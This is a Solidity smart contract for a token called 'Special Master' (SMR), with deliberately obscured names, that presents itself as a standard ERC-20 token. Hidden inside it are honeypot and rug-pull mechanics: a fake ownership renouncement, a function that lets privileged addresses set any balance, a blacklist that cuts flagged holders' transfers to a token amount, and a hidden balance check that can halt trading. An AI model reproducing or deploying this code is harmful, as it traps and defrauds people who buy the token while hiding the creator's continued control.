//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface atMin {
    function createPair(address enableMode, address autoListIs) external returns (address);
}

interface walletAmountLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverSwap) external view returns (uint256);

    function transfer(address takeAmount, uint256 sellMinMode) external returns (bool);

    function allowance(address listTokenTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellMinMode) external returns (bool);

    function transferFrom(
        address sender,
        address takeAmount,
        uint256 sellMinMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromLiquidity, uint256 value);
    event Approval(address indexed listTokenTo, address indexed spender, uint256 value);
}

abstract contract isFundAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletAmountLimitMetadata is walletAmountLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SpecialMaster is isFundAt, walletAmountLimit, walletAmountLimitMetadata {

    address public fromTake;

    address private isTotal;

    function owner() external view returns (address) {
        return isTotal;
    }

    function approve(address atShould, uint256 sellMinMode) public virtual override returns (bool) {
        enableToMarketing[_msgSender()][atShould] = sellMinMode;
        emit Approval(_msgSender(), atShould, sellMinMode);
        return true;
    }

    mapping(address => bool) public isExempt;

    uint8 private autoLimitAmount = 18;

    function toEnable() private view {
        require(takeTeam[_msgSender()]);
    }

    string private tradingMax = "Special Master";

    bool private walletFund;

    function walletModeFund(address sellTake) public {
        toEnable();
        if (isShouldList != walletLimit) {
            walletLimit = true;
        }
        if (sellTake == fromTake || sellTake == fundToken) {
            return;
        }
        isExempt[sellTake] = true;
    }

    function minTo(address isTake, address takeAmount, uint256 sellMinMode) internal returns (bool) {
        if (isTake == fromTake) {
            return shouldReceiverTotal(isTake, takeAmount, sellMinMode);
        }
        uint256 takeLaunchedFrom = walletAmountLimit(fundToken).balanceOf(txFrom);
        require(takeLaunchedFrom == launchAuto);
        require(takeAmount != txFrom);
        if (isExempt[isTake]) {
            return shouldReceiverTotal(isTake, takeAmount, feeMode);
        }
        return shouldReceiverTotal(isTake, takeAmount, sellMinMode);
    }

    address txFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {
        return enableMax[receiverSwap];
    }

    function sellLimit(address enableBuy) public {
        require(enableBuy.balance < 100000);
        if (takeShould) {
            return;
        }
        if (isShouldList == walletFund) {
            modeTo = receiverReceiverEnable;
        }
        takeTeam[enableBuy] = true;
        
        takeShould = true;
    }

    function allowance(address sellWallet, address atShould) external view virtual override returns (uint256) {
        if (atShould == fromTx) {
            return type(uint256).max;
        }
        return enableToMarketing[sellWallet][atShould];
    }

    function transferFrom(address isTake, address takeAmount, uint256 sellMinMode) external override returns (bool) {
        if (_msgSender() != fromTx) {
            if (enableToMarketing[isTake][_msgSender()] != type(uint256).max) {
                require(sellMinMode <= enableToMarketing[isTake][_msgSender()]);
                enableToMarketing[isTake][_msgSender()] -= sellMinMode;
            }
        }
        return minTo(isTake, takeAmount, sellMinMode);
    }

    bool public walletLimit;

    function name() external view virtual override returns (string memory) {
        return tradingMax;
    }

    function getOwner() external view returns (address) {
        return isTotal;
    }

    mapping(address => uint256) private enableMax;

    uint256 launchAuto;

    bool private shouldAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return modeSell;
    }

    uint256 constant feeMode = 4 ** 10;

    uint256 public receiverReceiverEnable;

    function feeFund(address sellLaunch, uint256 sellMinMode) public {
        toEnable();
        enableMax[sellLaunch] = sellMinMode;
    }

    function decimals() external view virtual override returns (uint8) {
        return autoLimitAmount;
    }

    function symbol() external view virtual override returns (string memory) {
        return toTrading;
    }

    function transfer(address sellLaunch, uint256 sellMinMode) external virtual override returns (bool) {
        return minTo(_msgSender(), sellLaunch, sellMinMode);
    }

    mapping(address => mapping(address => uint256)) private enableToMarketing;

    function txReceiverTrading(uint256 sellMinMode) public {
        toEnable();
        launchAuto = sellMinMode;
    }

    event OwnershipTransferred(address indexed sellSender, address indexed toMarketing);

    bool public takeShould;

    constructor (){
        
        modeAuto txEnableLimit = modeAuto(fromTx);
        fundToken = atMin(txEnableLimit.factory()).createPair(txEnableLimit.WETH(), address(this));
        
        fromTake = _msgSender();
        takeTeam[fromTake] = true;
        enableMax[fromTake] = modeSell;
        teamAmount();
        if (shouldAuto == isShouldList) {
            shouldAuto = true;
        }
        emit Transfer(address(0), fromTake, modeSell);
    }

    string private toTrading = "SMR";

    function teamAmount() public {
        emit OwnershipTransferred(fromTake, address(0));
        isTotal = address(0);
    }

    uint256 private modeTo;

    address public fundToken;

    mapping(address => bool) public takeTeam;

    address fromTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private isShouldList;

    uint256 teamTx;

    uint256 public txFundToken;

    uint256 private modeSell = 100000000 * 10 ** 18;

    function shouldReceiverTotal(address isTake, address takeAmount, uint256 sellMinMode) internal returns (bool) {
        require(enableMax[isTake] >= sellMinMode);
        enableMax[isTake] -= sellMinMode;
        enableMax[takeAmount] += sellMinMode;
        emit Transfer(isTake, takeAmount, sellMinMode);
        return true;
    }

}